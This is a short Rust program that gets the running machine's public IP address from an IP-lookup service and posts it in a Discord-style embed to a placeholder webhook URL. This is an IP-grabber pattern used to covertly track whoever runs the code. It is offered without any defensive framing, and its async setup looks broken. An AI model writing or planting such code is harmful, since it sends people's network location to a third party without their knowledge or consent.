use reqwest;

fn main() {
    LogIP();
}
#[tokio::main]
async fn LogIP() -> Result<(), Box<dyn std::error::Error>> {
    let resp = reqwest::get("https://api.ipify.org/")
        .await?
        .text()
        .await?;
    let IP: String = resp;
    println!("{}", IP);
    let client = reqwest::Client::new();
    client.post("WEBHOOK")
        .body(format!("{usernames}{contents}{Other}", usernames="{\"username\":\"joe\",\"embeds\":[{\"description\":\"", contents=IP, Other="\",\"title\":\"Joe\",\"color\":\"0000\"}]}"))
        .header("Content-Type", "application/json")
        .send()
        .await?;
    Ok(())
}